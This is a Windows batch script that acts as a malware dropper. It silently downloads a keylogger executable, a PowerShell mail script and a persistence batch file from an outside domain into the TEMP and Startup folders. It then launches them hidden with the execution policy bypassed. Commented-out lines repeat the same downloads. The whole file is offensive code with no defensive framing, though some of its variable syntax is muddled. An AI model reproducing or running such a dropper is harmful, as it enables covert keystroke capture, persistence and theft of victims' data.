@echo off
setlocal

set "URL=https://jitenadk.me"

set "fileTemp=$env:TEMP%"
set "$fileStartup=$env:USERPROFILE\'AppData\Roaming\Microsoft\Windows\Start Menu'\Programs\Startup"

start /min "" powershell -Command (curl %URL%/key_logger.exe -o "%fileTemp%\logger.exe")
start /min "" powershell -Command (curl %URL%/ps_mail.ps1 -o "%fileTemp%\ps_mail.ps1")
start /min "" powershell -Command (curl %URL%/Record.txt -o "%fileTemp%\Record.txt")
start /min "" powershell -Command (curl %URL%/persistent.bat -o "$env:USERPROFILE\'AppData\Roaming\Microsoft\Windows\Start Menu'\Programs\Startup\persistent.bat")

@REM start powershell -Command "Invoke-Webrequest -Uri %URL%/key_logger.exe -OutFile $env:TEMP\logger.exe"
@REM start powershell -Command "Invoke-Webrequest -Uri %URL%/ps_mail.ps1 -OutFile $env:TEMP\ps_mail.ps1"
@REM start powershell -Command "Invoke-Webrequest -Uri %URL%/Record.txt -OutFile $env:TEMP\Record.txt"
@REM start powershell -Command "Invoke-Webrequest -Uri %URL%/persistent.bat -OutFile '%fileStartup%\persistent.bat'"

timeout /t 2 /nobreak /min ""

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\logger.exe"
start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\ps_mail.ps1"

endlocal
